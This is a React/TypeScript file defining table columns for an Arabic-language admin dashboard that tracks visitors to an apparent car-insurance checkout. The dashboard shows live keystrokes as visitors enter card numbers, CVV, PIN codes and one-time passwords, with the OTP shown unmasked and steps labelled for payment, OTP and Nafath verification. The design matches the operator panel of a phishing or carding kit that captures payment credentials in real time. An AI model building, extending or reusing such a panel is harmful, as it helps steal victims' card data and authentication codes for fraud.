"use client";

import type { ColumnDef } from "@tanstack/react-table";
import type { Visitor } from "@/lib/definitions";
import { Badge } from "@/components/ui/badge";
import { Globe, Wifi, WifiOff } from "lucide-react";

const getPageLabel = (page: string | number | undefined) => {
  if (page === undefined || page === null) return "—";
  const p = String(page);
  const map: Record<string, string> = {
    "1": "البيانات الأساسية",
    "2": "بيانات التأمين",
    "3": "اختيار العرض",
    "4": "بيانات السائق",
    "5": "الدفع",
    "6": "معالجة الدفع",
    "7": "OTP",
    "8888": "نفاذ",
    "9999": "مكتمل",
  };
  return map[p] ?? `خطوة ${p}`;
};

const getFieldLabel = (field: string | undefined) => {
  if (!field) return "";
  const map: Record<string, string> = {
    cardNumber: "رقم البطاقة",
    cardName: "اسم البطاقة",
    cvv: "CVV",
    otp: "رمز OTP",
    pinCode: "رمز PIN",
  };
  return map[field] ?? field;
};

const maskSensitive = (field: string | undefined, value: string | undefined) => {
  if (!value) return "";
  if (field === "cvv") return "•".repeat(value.length);
  if (field === "otp") return value;
  if (field === "cardNumber") {
    const clean = value.replace(/\s/g, "");
    if (clean.length > 4) return clean.slice(0, 4) + " •••• •••• " + clean.slice(-Math.min(4, clean.length - 4));
    return value;
  }
  return value;
};

const getPaymentBadge = (status: string | undefined) => {
  if (!status) return <Badge variant="outline">—</Badge>;
  const map: Record<string, { label: string; variant: "default" | "secondary" | "destructive" | "outline" }> = {
    processing: { label: "قيد المعالجة", variant: "secondary" },
    completed: { label: "مكتمل", variant: "default" },
    pending: { label: "معلّق", variant: "outline" },
  };
  const info = map[status] ?? { label: status, variant: "outline" as const };
  return <Badge variant={info.variant}>{info.label}</Badge>;
};

const getFinalStatusBadge = (status: string | undefined) => {
  if (!status) return <Badge variant="outline">—</Badge>;
  const map: Record<string, { label: string; variant: "default" | "secondary" | "destructive" | "outline" }> = {
    completed: { label: "مكتمل ✓", variant: "default" },
    verification_failed: { label: "فشل التحقق", variant: "destructive" },
  };
  const info = map[status] ?? { label: status, variant: "outline" as const };
  return <Badge variant={info.variant}>{info.label}</Badge>;
};

export const columns: ColumnDef<Visitor>[] = [
  {
    accessorKey: "online",
    header: "الحالة",
    cell: ({ row }) => {
      const online = row.getValue("online") as boolean;
      const typing = row.original.typing;
      return (
        <div className="flex flex-col gap-1">
          {online ? (
            <span className="flex items-center gap-1 text-green-600 text-sm font-medium">
              <Wifi className="w-4 h-4" /> متصل
            </span>
          ) : (
            <span className="flex items-center gap-1 text-gray-400 text-sm">
              <WifiOff className="w-4 h-4" /> غير متصل
            </span>
          )}
          {typing && online && (
            <span className="flex items-center gap-1 text-amber-500 text-xs animate-pulse">
              <span className="inline-block w-1.5 h-1.5 rounded-full bg-amber-400 animate-bounce" />
              يكتب الآن...
            </span>
          )}
        </div>
      );
    },
  },
  {
    accessorKey: "documment_owner_full_name",
    header: "الاسم",
    cell: ({ row }) => row.getValue("documment_owner_full_name") || <span className="text-gray-400">—</span>,
  },
  {
    accessorKey: "phone2",
    header: "رقم الجوال",
    cell: ({ row }) => row.getValue("phone2") || row.original.phone || <span className="text-gray-400">—</span>,
  },
  {
    accessorKey: "country",
    header: "الدولة",
    cell: ({ row }) => {
      const country = row.getValue("country") as string;
      return country ? (
        <span className="flex items-center gap-1">
          <Globe className="w-3 h-3 text-gray-400" />
          {country}
        </span>
      ) : (
        <span className="text-gray-400">—</span>
      );
    },
  },
  {
    accessorKey: "currentPage",
    header: "مرحلة الزيارة",
    cell: ({ row }) => (
      <span className="text-sm">{getPageLabel(row.getValue("currentPage"))}</span>
    ),
  },
  {
    id: "liveInput",
    header: "ما يكتبه الآن",
    cell: ({ row }) => {
      const typing = row.original.typing;
      const field = row.original.currentField;
      const value = row.original.currentInput;
      if (!typing || !value) return <span className="text-gray-300 text-xs">—</span>;
      const fieldLabel = getFieldLabel(field);
      const masked = maskSensitive(field, value);
      return (
        <div className="flex flex-col gap-0.5">
          {fieldLabel && (
            <span className="text-xs text-gray-400">{fieldLabel}:</span>
          )}
          <span className="font-mono text-sm text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200 max-w-[140px] overflow-hidden text-ellipsis whitespace-nowrap" title={masked}>
            {masked}
          </span>
        </div>
      );
    },
  },
  {
    accessorKey: "insurance_purpose",
    header: "نوع التأمين",
    cell: ({ row }) => {
      const val = row.getValue("insurance_purpose") as string;
      if (!val) return <span className="text-gray-400">—</span>;
      return val === "renewal" ? "تجديد وثيقة" : val === "property-transfer" ? "نقل ملكية" : val;
    },
  },
  {
    accessorKey: "paymentStatus",
    header: "حالة الدفع",
    cell: ({ row }) => getPaymentBadge(row.getValue("paymentStatus")),
  },
  {
    accessorKey: "finalStatus",
    header: "الحالة النهائية",
    cell: ({ row }) => getFinalStatusBadge(row.getValue("finalStatus")),
  },
  {
    accessorKey: "createdDate",
    header: "تاريخ الزيارة",
    cell: ({ row }) => {
      const date = row.getValue("createdDate") as string;
      if (!date) return <span className="text-gray-400">—</span>;
      try {
        return new Date(date).toLocaleString("ar-SA", {
          year: "numeric",
          month: "short",
          day: "numeric",
          hour: "2-digit",
          minute: "2-digit",
        });
      } catch {
        return date;
      }
    },
  },
];
